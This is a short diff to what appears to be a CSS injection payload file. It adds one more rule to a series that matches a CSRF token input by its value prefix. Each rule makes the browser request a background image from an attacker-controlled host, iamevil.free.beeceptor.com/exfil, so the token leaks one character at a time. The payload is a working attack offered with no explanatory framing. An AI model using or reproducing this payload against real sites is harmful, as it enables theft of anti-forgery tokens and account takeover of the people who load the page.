@@ -76,3 +76,4 @@ input[name^="csrf"][value^="ruW-tjL1BWCdhbiOSCA7="] { background-image: url("htt
 input[name^="csrf"][value^="ruW-tjL1BWCdhbiOSCA7)"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL1BWCdhbiOSCA7)"); }
 input[name^="csrf"][value^="ruW-tjL1BWCdhbiOSCA7("] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL1BWCdhbiOSCA7("); }
 input[name^="csrf"][value^="ruW-tjL1BWCdhbiOSCA7)"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL1BWCdhbiOSCA7)"); }
+input[name^="csrf"][value^="ruW-tjL1BWCdhbiOSCA7_"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL1BWCdhbiOSCA7_"); }
